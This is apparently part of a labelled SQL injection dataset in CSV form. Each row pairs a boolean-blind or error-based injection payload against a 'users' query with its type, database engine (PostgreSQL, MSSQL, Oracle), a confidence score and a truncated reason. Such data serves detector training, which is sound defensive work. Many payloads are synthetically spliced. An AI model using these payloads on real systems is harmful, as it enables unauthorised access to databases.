id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
38154,"select * from users WHERE username = ""-9987 ) ) ) or ( ( ( 2114 = 2114"" or username = ""1 ) and username = ""-8112\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38155,"-6353%\' ) ) and username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38156,"-5667%\' ) ) and username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38157,"select * from users WHERE username = ""-2733\' ) ) ) or username = ""-9501\' )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38158,"select * from users WHERE username = ""1\' and username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38159,1\' ) and ( \'bmhw\' like \'bmhw,unknown,generic,0.50,Insufficient data to classify payload type,1
38160,"select * from users WHERE username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"" or username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38161,"1\'+ ( select oljg where 2006 = 2006 or username = ""1 ) ) ) and ( ( ( 6395 = 6395",unknown,generic,0.50,Insufficient data to classify payload type,1
38162,"-6079 ) ) ) and username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso",unknown,generic,0.50,Insufficient data to classify payload type,1
38163,"select * from users WHERE username = ""1 and username = ""1\' ) and ( \'ulkq\' = \'ulkq"" or username = ""1\' where 8537 = 8537 and username = ""-6079 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38164,"select * from users WHERE username = ""-1889%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\'+ ( select oljg where 2006 = 2006",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38165,"select * from users WHERE username = ""1\' ) ) and username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""-8112\' ) ) )",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38166,"select * from users WHERE username = ""1\' ) ) ) or username = ""1 ) ) ) and ( ( ( 4694 = 4694"" and username = ""-1549\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38167,"select * from users WHERE username = ""-9668\' ) ) as orfu where 5822 = 5822 or username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38168,"-5863"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38169,"1\'+ ( select oljg where 2006 = 2006 OR username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38170,"select * from users WHERE username = ""1%\' ) or username = ""-2374 ) and username = ""-3424\' ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38171,"1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 and username = ""1\' ) ) and ( ( \'esal\' = \'esal",unknown,generic,0.50,Insufficient data to classify payload type,1
38172,"1 ) as nbno where 9816 = 9816 or username = ""1\' ) and ( \'ulkq\' = \'ulkq",unknown,generic,0.50,Insufficient data to classify payload type,1
38173,"select * from users WHERE username = ""-5880\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'rwgl\' = \'rwgl"" and username = ""1\'|| ( select \'mgel\' where 3591 = 3591",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38174,"select * from users WHERE username = ""1\'|| ( select \'adiv\' from dual where 9842 = 9842 and username = ""-5062 ) where 7457 = 7457 or username = ""1%\'",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38175,"select * from users WHERE username = ""-9847%\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38176,"-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""-3978 or username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38177,"1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38178,"1\'+ ( select oljg where 2006 = 2006 and username = ""-4108\' ) and username = ""-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz",unknown,generic,0.50,Insufficient data to classify payload type,1
38179,"-3978 and username = ""-7209\' ) ) ) and ( ( ( \'stqx\' = \'stqx",unknown,generic,0.50,Insufficient data to classify payload type,1
38180,"select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" or username = ""-3978 or username = ""-3899\' ) where 8152 = 8152",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38181,"-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-6353%\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38182,"select * from users WHERE username = ""-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz"" and username = ""-2495 ) ) as hudw where 4197 = 4197",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38183,"1\' ) where 1502 = 1502 or username = ""-7199\' or username = ""-6523",unknown,generic,0.50,Insufficient data to classify payload type,1
38184,1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38185,"select * from users WHERE username = ""-5291\' ) ) or username = ""1 ) ) ) and ( ( ( 9548 = 9548"" or username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38186,"1%\' or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38187,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'%\' = \'"" and ( ( ( \'%\' = \'"" and username = ""-4248 where 3288 = 3288",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38188,"-1549\' ) or username = ""1\' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'mmow\' = \'mmow",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38189,"1%\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1\' ) where 1502 = 1502 and ( ( 5616 = 5616"" and ( ( ( \'winx\' = \'winx",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38190,"select * from users WHERE username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1%\' ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38191,"select * from users WHERE username = ""-2783%\' ) ) or username = ""-7962\' ) ) as pgqz where 6058 = 6058 and username = ""-7430\' ) as xfah where 1596 = 1596",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38192,"-7430\' ) as xfah where 1596 = 1596 or username = ""1\' ) and username = ""-1190\' and \'yxry\' like \'yxry"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38193,"select * from users WHERE username = ""-2374 ) and ( 2576 = 2576"" and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38194,"select * from users WHERE username = ""-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'tbmu\' like \'tbmu"" and username = ""1\' ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38195,"select * from users WHERE username = ""-5217 where 3620 = 3620 or username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38196,"select * from users WHERE username = ""-1190\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" or username = ""-9668\' ) ) as orfu where 5822 = 5822",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38197,"1\'+ ( select vohg where 6383 = 6383 or username = ""-6353%\' ) ) or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
38198,"-7199\' and username = ""-9564 or username = ""-4610\' ) ) and ( ( \'hdco\' = \'hdco",unknown,generic,0.50,Insufficient data to classify payload type,1
38199,"select * from users WHERE username = ""1\' ) ) and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38200,"select * from users WHERE username = ""1 and username = ""-5863"" and username = ""1 ) ) as dgso where 4654 = 4654",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38201,1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38202,"select * from users WHERE username = ""-1985 ) ) ) and username = ""-7452\' and \'nmdq\' like \'nmdq"" and username = ""-2733\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38203,"select * from users WHERE username = ""1\' ) ) and ( ( \'guxv\' = \'guxv"" or username = ""1"" and username = ""1",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38204,"1 where 5161 = 5161 OR username = ""-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38205,"1\' ) ) and username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 7732 = 7732",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38206,"select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and ( ( ( \'xopg\' = \'xopg"" and username = ""1\'+ ( select twyt where 3376 = 3376 or username = ""-2756\' where 6156 = 6156",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38207,"1 ) or username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'esal\' = \'esal",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38208,"select * from users WHERE username = ""-9564 or username = ""1\'+ ( select twyt where 3376 = 3376 or username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38209,"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" and username = ""-8860 ) and username = ""-7199\' and username = ""-7962\' ) ) as pgqz where 6058 = 6058",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38210,"1 ) ) and username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38211,"select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" or username = ""-1190\' and username = ""-8860 )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38212,-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38213,"1\' ) ) ) or username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38214,-9668\' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38215,"-2733\' ) ) ) and username = ""-9668\' ) ) as orfu where 5822 = 5822 and username = ""-2679\' ) ) ) and ( ( ( \'cutk\' like \'cutk",unknown,generic,0.50,Insufficient data to classify payload type,1
38216,"select * from users WHERE username = ""-9987 ) ) ) or ( ( ( 2114 = 2114"" or username = ""1\' )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38217,"select * from users WHERE username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" or username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38218,"-7199\' or \'qibr\' = \'qibr"" and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38219,"-9564 or username = ""-9263\' ) as qodg where 6798 = 6798 or username = ""-7199\' or \'qibr\' = \'qibr",unknown,generic,0.50,Insufficient data to classify payload type,1
38220,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38221,"1 and username = ""-5863"" or username = ""1 ) ) and ( ( 6659 = 6659",unknown,generic,0.50,Insufficient data to classify payload type,1
38222,"select * from users WHERE username = ""1\' or username = ""1 ) and username = ""1\'|| ( select \'vasx\' where 4770 = 4770",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
